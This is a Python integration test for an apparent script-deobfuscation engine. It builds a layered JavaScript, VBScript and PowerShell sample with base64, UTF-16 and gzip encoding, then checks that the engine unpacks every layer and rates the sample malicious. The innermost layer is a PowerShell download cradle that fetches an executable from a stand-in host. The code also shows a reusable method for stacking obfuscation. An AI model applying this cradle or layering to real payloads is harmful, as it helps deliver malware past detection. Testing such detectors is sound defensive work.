"""Integration test reproducing Sample S1 cross-language unpacking chain.

Paper References:
- Section 3.6 & Figure 10: S1 Analysis Tree (JS -> VBScript -> PowerShell -> Gunzip -> EncodedCommand)
- Section 3.3: 82% of samples reaching depth >= 3 utilize at least 2 distinct decoders
"""

import base64
import gzip
from descrypt.core.engine import DeScryptEngine


def build_sample_s1_chain() -> str:
    """Constructs a multi-language obfuscation chain matching Figure 10:

    d0: input .js (escape encoded)
    d1: VBScript (base64 blob)
    d2: VBScript UTF-16
    d3: PowerShell (base64 gzip)
    d4: Gzip binary
    d5: Decoded utf-16 with PowerShell -EncodedCommand
    """
    # d5 payload: PowerShell command
    terminal_ps = "$c2 = 'hxxp://c2-domain.example/malware.exe'; (New-Object Net.WebClient).DownloadFile($c2, 'out.exe')"
    terminal_ps_b64 = base64.b64encode(terminal_ps.encode("utf-16-le")).decode("ascii")
    d5_script = f"powershell.exe -EncodedCommand {terminal_ps_b64}"

    # d4: Gzip compress d5
    d4_gzip = gzip.compress(d5_script.encode("utf-16-le"))

    # d3: PowerShell holding base64 of d4
    d3_b64 = base64.b64encode(d4_gzip).decode("ascii")
    d3_script = f"$gz_data = '{d3_b64}'; Invoke-Expression (Decompress $gz_data)"

    # d2: UTF-16LE of d3
    d2_bytes = d3_script.encode("utf-16-le")
    d1_b64 = base64.b64encode(d2_bytes).decode("ascii")

    # d1: VBScript holding d1_b64
    d1_vbs = f'Dim b64\nb64 = "{d1_b64}"\nWScript.Echo b64'

    # d0: JavaScript escape encoded
    # %xx escape encoding of d1
    d0_js = "function run() { var vbs = unescape('" + "".join(f"%{b:02x}" for b in d1_vbs.encode("utf-8")) + "'); eval(vbs); }"
    return d0_js


def test_cross_language_s1_pipeline():
    sample_js = build_sample_s1_chain()
    engine = DeScryptEngine(mode="static", max_depth=12)
    report = engine.analyze(sample_js, run_id="sample_s1_test")

    assert report.total_nodes >= 5
    assert report.max_depth >= 4

    # Verify multiple distinct decoders were invoked across layers (Section 3.3)
    tools_used = {l.producing_tool for l in report.layers if l.producing_tool}
    assert len(tools_used) >= 3
    assert "generic.escape_decode" in tools_used or "generic.base64_decode" in tools_used

    # Verify score is flagged malicious (c2 cradle recovered)
    assert report.score >= 0.50
    assert report.verdict == "malicious"
